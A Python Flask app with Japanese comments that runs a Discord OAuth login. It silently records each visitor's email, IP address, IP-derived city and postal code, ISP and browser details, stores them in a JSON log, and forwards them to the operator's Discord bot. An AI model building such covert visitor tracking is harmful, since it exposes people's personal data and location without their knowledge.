import os
import json
import threading
import requests
from datetime import datetime
from flask import Flask, request, render_template
from user_agents import parse
from dotenv import load_dotenv
from discord_bot import bot, enqueue_task

load_dotenv()
app = Flask(__name__)
ACCESS_LOG_FILE = "access_log.json"

DISCORD_CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")
DISCORD_CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET")
DISCORD_REDIRECT_URI = os.getenv("DISCORD_REDIRECT_URI")

# 自宅付近の固定緯度経度（さいたま市例）
FIXED_LAT = 35.9
FIXED_LON = 139.6


def get_client_ip():
    if "X-Forwarded-For" in request.headers:
        return request.headers["X-Forwarded-For"].split(",")[0].strip()
    return request.remote_addr


def get_geo_info(ip):
    try:
        res = requests.get(
            f"http://ip-api.com/json/{ip}?lang=ja&fields=status,message,country,regionName,city,zip,isp,as,proxy,hosting,query"
        )
        data = res.json()
        return {
            "ip": data.get("query"),
            "country": data.get("country", "不明"),
            "region": data.get("regionName", "不明"),
            "city": data.get("city", "不明"),
            "zip": data.get("zip", "不明"),
            "isp": data.get("isp", "不明"),
            "as": data.get("as", "不明"),
            "proxy": data.get("proxy", False),
            "hosting": data.get("hosting", False),
            "lat": FIXED_LAT,
            "lon": FIXED_LON,
        }
    except:
        return {
            "ip": ip, "country": "不明", "region": "不明",
            "city": "不明", "zip": "不明", "isp": "不明", "as": "不明",
            "proxy": False, "hosting": False,
            "lat": FIXED_LAT, "lon": FIXED_LON
        }


def save_log(discord_id, data):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    if os.path.exists(ACCESS_LOG_FILE):
        with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
            logs = json.load(f)
    else:
        logs = {}

    if discord_id not in logs:
        logs[discord_id] = {"history": []}

    data["timestamp"] = now
    logs[discord_id]["history"].append(data)

    with open(ACCESS_LOG_FILE, "w", encoding="utf-8") as f:
        json.dump(logs, f, indent=4, ensure_ascii=False)


@app.route("/")
def index():
    discord_auth_url = (
        f"https://discord.com/oauth2/authorize?client_id={DISCORD_CLIENT_ID}"
        f"&redirect_uri={DISCORD_REDIRECT_URI}&response_type=code&scope=identify%20email%20guilds%20connections"
    )
    return render_template("index.html", discord_auth_url=discord_auth_url)


@app.route("/callback")
def callback():
    code = request.args.get("code")
    if not code:
        return "コードがありません", 400

    data = {
        "client_id": DISCORD_CLIENT_ID,
        "client_secret": DISCORD_CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": DISCORD_REDIRECT_URI,
        "scope": "identify email guilds connections",
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    res = requests.post("https://discord.com/api/oauth2/token", data=data, headers=headers)
    token = res.json()
    access_token = token.get("access_token")
    if not access_token:
        return "アクセストークン取得失敗", 400

    headers_auth = {"Authorization": f"Bearer {access_token}"}
    user = requests.get("https://discord.com/api/users/@me", headers=headers_auth).json()

    ip = get_client_ip()
    geo = get_geo_info(ip)
    ua = parse(request.headers.get("User-Agent", ""))

    log_data = {
        "username": f"{user.get('username')}#{user.get('discriminator')}",
        "id": user.get("id"),
        "email": user.get("email"),
        "premium": user.get("premium_type", 0),
        "locale": user.get("locale", "不明"),
        "ip": geo["ip"],
        "region": geo["region"],
        "city": geo["city"],
        "zip": geo["zip"],
        "country": geo["country"],
        "isp": geo["isp"],
        "as": geo["as"],
        "proxy": geo["proxy"],
        "hosting": geo["hosting"],
        "browser": f"{ua.browser.family} {ua.browser.version_string}",
        "os": ua.os.family,
        "device": ua.device.family,
        "bot": False,
        "lat": geo["lat"],
        "lon": geo["lon"],
        "map_link": f"https://www.google.com/maps?q={geo['lat']},{geo['lon']}"
    }

    save_log(user.get("id"), log_data)

    # Discord Bot に安全に送信
    enqueue_task(embed_data={
        "title": "✅ 新しいアクセスログ",
        "description": f"名前: {log_data['username']}\nID: {log_data['id']}\nメール: {log_data['email']}\n"
                       f"Premium: {log_data['premium']} / Locale: {log_data['locale']}\n"
                       f"IP: {log_data['ip']} / Proxy: {log_data['proxy']} / Hosting: {log_data['hosting']}\n"
                       f"国: {log_data['country']} / {log_data['region']} / {log_data['city']} / {log_data['zip']}\n"
                       f"ISP: {log_data['isp']} / AS: {log_data['as']}\n"
                       f"UA: {request.headers.get('User-Agent')}\n"
                       f"OS: {log_data['os']} / ブラウザ: {log_data['browser']}\n"
                       f"デバイス: {log_data['device']} / Bot判定: {log_data['bot']}\n"
                       f"📍 地図リンク: {log_data['map_link']}"
    }, user_id=user.get("id"))

    return render_template("welcome.html", username=log_data["username"])


def start_bot_thread():
    threading.Thread(target=lambda: bot.run(os.getenv("DISCORD_BOT_TOKEN")), daemon=True).start()


if __name__ == "__main__":
    start_bot_thread()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
